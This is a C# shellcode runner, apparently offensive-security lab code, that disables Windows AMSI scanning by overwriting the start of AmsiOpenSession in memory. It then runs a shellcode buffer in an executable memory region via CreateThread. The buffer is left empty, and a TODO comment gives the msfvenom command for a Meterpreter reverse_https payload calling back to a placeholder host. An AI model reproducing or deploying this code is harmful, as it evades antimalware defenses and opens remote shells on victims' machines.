using System;
using System.Runtime.InteropServices;
using System.Text;

namespace CSharpRunner
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out uint lpflOldProtect);


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();


        static void Main(string[] args)
        {
            // Bypass AMSI
            // LoadLibrary
            IntPtr amsilib = LoadLibrary("amsi.dll");
            // GetProcAddress
            IntPtr openSessionAddr = GetProcAddress(amsilib, "AmsiOpenSession");
            Console.WriteLine("AmsiOpenSession is: " + openSessionAddr);
            Console.ReadKey();
            Console.WriteLine("Resuming...");
            // Create oldProtectionBuffer
            uint oldProtect;
            // VirtualProtect
            VirtualProtect(openSessionAddr, 3, 0x40, out oldProtect);
            Console.WriteLine("The page protection has been modified.");
            Console.ReadKey();
            Console.WriteLine("Resuming...");
            // copy new buffer
            byte[] protectBuf = new byte[3] { 0x48, 0x31, 0xC0 };
            Marshal.Copy(protectBuf, 0, openSessionAddr, 3);
            Console.WriteLine("The buffer has been overwritten.");
            Console.ReadKey();
            Console.WriteLine("Resuming...");
            // VirtualProtect cover steps
            VirtualProtect(openSessionAddr, 3, 0x20, out oldProtect);
            Console.WriteLine("The page protection has been modified.");
            Console.ReadKey();
            Console.WriteLine("Resuming...");


            // TODO: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[768] {};

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
